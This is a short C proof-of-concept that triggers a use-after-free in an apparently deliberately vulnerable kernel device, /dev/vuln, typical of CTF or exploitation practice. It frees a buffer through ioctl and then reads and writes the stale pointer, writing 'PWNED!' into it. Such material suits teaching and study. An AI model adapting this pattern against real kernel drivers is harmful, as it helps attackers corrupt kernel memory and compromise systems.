#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/ioctl.h>
#include <linux/types.h>

#define K1_TYPE 0xB9

#define ALLOC _IOW(K1_TYPE, 0, size_t)
#define FREE _IO(K1_TYPE, 1)
#define USE_READ _IOR(K1_TYPE, 2, char *)
#define USE_WRITE _IOW(K1_TYPE, 3, char *)

int main() {
    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) {
        perror("Failed to open /dev/vuln");
        return 1;
    }

    printf("Successfully opened /dev/vuln\n");

    // Example usage:
    size_t alloc_size = 0x100;
    printf("Allocating size 0x%lx\n", alloc_size);
    if (ioctl(fd, ALLOC, &alloc_size) < 0) {
        perror("ALLOC failed");
        close(fd);
        return 1;
    }
    printf("ALLOC successful\n");

    printf("Freeing buffer\n");
    if (ioctl(fd, FREE) < 0) {
        perror("FREE failed");
        close(fd);
        return 1;
    }
    printf("FREE successful\n");

    // Now the buffer is freed, but 'buf' in kernel is not NULL.
    // We can trigger UAF here.
    char read_buf[0x100];
    printf("Attempting USE_READ on freed buffer\n");
    if (ioctl(fd, USE_READ, read_buf) < 0) {
        perror("USE_READ failed");
        close(fd);
        return 1;
    }
    printf("USE_READ successful, data: %s\n", read_buf);

    char write_buf[] = "PWNED!";
    printf("Attempting USE_WRITE on freed buffer with data: %s\n", write_buf);
    if (ioctl(fd, USE_WRITE, write_buf) < 0) {
        perror("USE_WRITE failed");
        close(fd);
        return 1;
    }
    printf("USE_WRITE successful\n");

    close(fd);
    return 0;
}